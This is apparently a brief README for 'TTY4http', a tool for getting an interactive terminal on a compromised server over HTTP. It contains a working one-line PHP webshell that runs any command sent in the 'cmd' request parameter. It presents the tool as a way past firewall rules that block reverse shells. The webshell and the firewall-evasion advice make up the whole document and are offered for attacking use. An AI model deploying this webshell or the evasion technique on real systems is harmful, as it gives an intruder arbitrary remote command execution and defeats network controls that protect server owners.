# TTY4http

Using a basic webshell:

```php
// webshell
<?php 
    system($_REQUEST['cmd']); 
?>
```

Obtain a tty by http, ideal for when iptables rules are implemented, preventing the option of a reverse shell by tcp or udp.
